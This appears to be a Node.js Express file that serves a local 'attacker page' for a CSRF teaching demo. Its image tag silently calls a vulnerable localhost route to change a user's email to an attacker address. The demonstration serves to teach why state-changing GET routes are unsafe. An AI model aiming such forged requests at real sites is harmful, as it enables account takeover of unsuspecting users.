const express = require('express');
const app = express();

// A local, harmless simulation of a third-party page. It targets only localhost.
app.get('/', (_req, res) => {
  res.type('html').send(`<!doctype html>
<title>Local CSRF demonstration</title>
<h1>Local attacker page</h1>
<p>This page demonstrates why a state-changing GET route is unsafe.</p>
<img src="http://localhost:3000/vulnerable/update-email?email=attacker%40example.test" alt="attack request">
<p>Return to the victim application to see the changed email.</p>`);
});

app.listen(4000, () => console.log('Local attacker page: http://localhost:4000'));
